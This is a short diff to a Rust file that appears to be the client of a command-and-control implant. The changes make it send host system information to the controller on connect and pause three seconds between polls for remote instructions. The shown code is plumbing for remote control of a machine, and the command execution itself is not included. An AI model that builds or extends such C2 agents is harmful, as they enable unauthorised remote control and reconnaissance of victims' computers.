@@ -1,6 +1,7 @@
 use std::io::{self, BufRead, BufReader, Write};
 use std::net::TcpStream;
 use std::process::Command;
+use std::{thread, time};
 
 
 use crate::config::{Config, C2Command};
@@ -90,11 +91,17 @@ pub fn send_sys_info(stream: &mut TcpStream) {
 ///
 /// An `io::Result<()>` indicating the success or failure of the operation.
 pub fn listening_for_instructions(stream: &mut TcpStream) -> io::Result<()> {
-    let mut buffer: Vec<u8> = Vec::new();
 
+
+    // send host info
+    send_sys_info(stream);
+
+
+    let mut buffer: Vec<u8> = Vec::new();
     let mut reader = BufReader::new(stream.try_clone()?);
 
     loop {
+
         buffer.clear();
         match reader.read_until(b'\n', &mut buffer) {
             Ok(bytes_read) => {
@@ -136,6 +143,11 @@ pub fn listening_for_instructions(stream: &mut TcpStream) -> io::Result<()> {
                 println!("[E] Error reading from stream: {}", e);
             }
         }
+
+
+        // Sleep a bit
+        thread::sleep(time::Duration::from_secs(3));
+
     }
 
     Ok(())
